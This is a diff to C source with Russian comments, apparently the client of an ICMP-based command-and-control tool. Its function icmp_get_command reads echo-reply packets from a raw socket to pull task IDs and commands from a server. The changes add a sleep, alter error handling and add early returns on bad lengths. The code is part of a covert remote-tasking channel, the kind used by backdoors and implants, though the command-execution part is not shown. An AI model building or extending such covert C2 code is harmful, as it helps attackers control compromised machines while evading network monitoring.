@@ -112,9 +112,9 @@ static int icmp_get_command(/*[OUT]*/ char* command,/*[OUT]*/ char* task_id, siz
 
     int recv_len = recvfrom(current_sockfd, packet, sizeof(packet), 0, (struct sockaddr*)&from, &from_len);
     
-    if(recv_len < 0) {
-        printf("[-/ICMP] Error recvfrom.\n");
-        return 0;
+    if(recv_len <= 0) {
+        printf("No tasks.\n");
+        return 1;
     } else {
         //анализ
         //данные приходят в сырой сокет с ip заголовком, который тоже надо обработать
@@ -125,6 +125,7 @@ static int icmp_get_command(/*[OUT]*/ char* command,/*[OUT]*/ char* task_id, siz
         //icmp заголовок
         struct icmphdr* icmp_hdr = (struct icmphdr*)(packet + ip_hdr_len);
 
+        sleep(3);
         if(icmp_hdr->type == ICMP_ECHOREPLY) {
             printf("[+/ICMP] Recevied task from server (%s).\n", inet_ntoa(from.sin_addr));
             
@@ -142,6 +143,7 @@ static int icmp_get_command(/*[OUT]*/ char* command,/*[OUT]*/ char* task_id, siz
                         size_t len = data_from - pos;
                         if(len > max_len_task_id) {
                             printf("[-/ICMP] Error. Len task_id invalid.\n");
+                            return 1;
                         }
                         char task_id_tmp[50] = {0};
                         memcpy(task_id_tmp, data_from, len);
@@ -153,6 +155,7 @@ static int icmp_get_command(/*[OUT]*/ char* command,/*[OUT]*/ char* task_id, siz
                             len = data_from - pos;
                             if(len > max_len_command) {
                                 printf("[-/ICMP] Error. Len task_command invalid.\n");
+                                return 1;
                             }
                             char task[100] = {0};
 
